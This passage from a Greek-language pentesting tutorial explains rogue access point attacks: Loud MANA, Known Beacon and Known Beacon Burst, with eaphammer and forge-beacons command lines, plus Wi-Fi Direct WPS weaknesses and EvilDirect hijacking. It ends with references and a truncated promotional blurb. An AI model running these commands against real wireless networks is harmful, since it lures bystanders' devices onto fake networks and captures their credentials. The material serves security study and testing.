Μια **δυνατή επίθεση MANA** είναι μια προηγμένη στρατηγική για περιπτώσεις όπου οι συσκευές δεν χρησιμοποιούν κατευθυνόμενη ανίχνευση ή όταν οι λίστες προτιμώμενων δικτύων (PNL) τους είναι άγνωστες στον επιτιθέμενο. Λειτουργεί με βάση την αρχή ότι **οι συσκευές στην ίδια περιοχή πιθανότατα θα μοιράζονται ορισμένα ονόματα δικτύων στις λίστες PNL τους**. Αντί να απαντά εκλεκτικά, αυτή η επίθεση εκπέμπει απαντήσεις ανίχνευσης για κάθε όνομα δικτύου (ESSID) που βρίσκεται στις συνδυασμένες λίστες PNL όλων των παρατηρούμενων συσκευών. Αυτή η ευρεία προσέγγιση αυξάνει την πιθανότητα μιας συσκευής να αναγνωρίσει ένα γνωστό δίκτυο και να προσπαθήσει να συνδεθεί με το παραπλανητικό Σημείο Πρόσβασης (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Επίθεση γνωστού Beacon

Όταν η επίθεση **Loud MANA** δεν είναι αρκετή, η επίθεση **γνωστού Beacon** παρουσιάζει μια άλλη προσέγγιση. Αυτή η μέθοδος **δοκιμάζει όλες τις δυνατές συνδέσεις προσομοιώνοντας ένα AP που απαντά σε οποιοδήποτε όνομα δικτύου, περνώντας από μια λίστα πιθανών ESSID που προέρχονται από έναν κατάλογο λέξεων**. Αυτό προσομοιώνει την ύπαρξη πολλαπλών δικτύων, ελπίζοντας να ταιριάξει ένα ESSID με το PNL του θύματος, προκαλώντας μια προσπάθεια σύνδεσης στο πλαστογραφημένο AP. Η επίθεση μπορεί να ενισχυθεί συνδυάζοντάς την με την επιλογή `--loud` για μια πιο επιθετική προσπάθεια να παγιδεύσει συσκευές.

Το Eaphammer υλοποίησε αυτήν την επίθεση ως μια επίθεση MANA όπου όλα τα ESSID μέσα σε μια λίστα φορτώνονται (μπορείτε επίσης να συνδυάσετε αυτό με την επιλογή `--loud` για να δημιουργήσετε μια επίθεση Loud MANA + γνωστά beacons):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Επίθεση γνωστού Beacon Burst**

Η **επίθεση γνωστού Beacon Burst** περιλαμβάνει τη **γρήγορη εκπομπή πλαισίων beacon για κάθε ESSID που αναφέρεται σε ένα αρχείο**. Αυτό δημιουργεί έναν πυκνό περιβάλλον με ψεύτικα δίκτυα, αυξάνοντας σημαντικά την πιθανότητα σύνδεσης των συσκευών με το παραποιημένο AP, ειδικά όταν συνδυάζεται με μια επίθεση MANA. Αυτή η τεχνική εκμεταλλεύεται την ταχύτητα και τον όγκο για να κατακλύσει τους μηχανισμούς επιλογής δικτύου των συσκευών.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Το Wi-Fi Direct** είναι ένα πρωτόκολλο που επιτρέπει συσκευές να συνδέονται απευθείας μεταξύ τους χρησιμοποιώντας Wi-Fi χωρίς την ανάγκη για έναν παραδοσιακό ασύρματο σημείο πρόσβασης. Αυτή η δυνατότητα ενσωματώνεται σε διάφορες συσκευές Internet of Things (IoT), όπως εκτυπωτές και τηλεοράσεις, διευκολύνοντας την απευθείας επικοινωνία μεταξύ συσκευών. Ένα χαρακτηριστικό του Wi-Fi Direct είναι ότι μία συσκευή αναλαμβάνει το ρόλο ενός σημείου πρόσβασης, γνωστού ως ο group owner, για να διαχειριστεί τη σύνδεση.

Η ασφάλεια για τις συνδέσεις Wi-Fi Direct διαμορφώνεται μέσω του **Wi-Fi Protected Setup (WPS)**, το οποίο υποστηρίζει αρκετές μεθόδους για ασφαλή ζεύξη, συμπεριλαμβανομένων:
- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Αυτές οι μέθοδοι, ιδιαίτερα η εισαγωγή του PIN, είναι ευάλωτες στις ίδιες ευπάθειες με το WPS σε παραδοσιακά δίκτυα Wi-Fi, καθιστώντας τις στόχο για παρόμοια διανυσματικά επιθέσεις.

### EvilDirect Hijacking

**Το EvilDirect Hijacking** είναι μια επίθεση που σχετίζεται με το Wi-Fi Direct. Αντικατοπτρίζει την έννοια μιας επίθεσης Evil Twin αλλά στοχεύει συνδέσεις Wi-Fi Direct. Σε αυτό το σενάριο, ένας επιτιθέμενος προσποιείται ως ένας νόμιμος group owner με σκοπό να απατήσει τις συσκευές να συνδεθούν με ένα κακόβουλο στοιχείο. Αυτή η μέθοδος μπορεί να εκτελεστεί χρησιμοποιώντας εργαλεία όπως το `airbase-ng` με την καθορισμένη κανάλι, ESSID και διεύθυνση MAC της προσποιηθείσας συσκευής:

## Αναφορές

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Ρίξτε μια ματιά στο [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (σύνδεση με το Facebook και προσομοίωση WPA σε captive portals)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Hacking**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Hack σε πραγματικό χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες ανακ
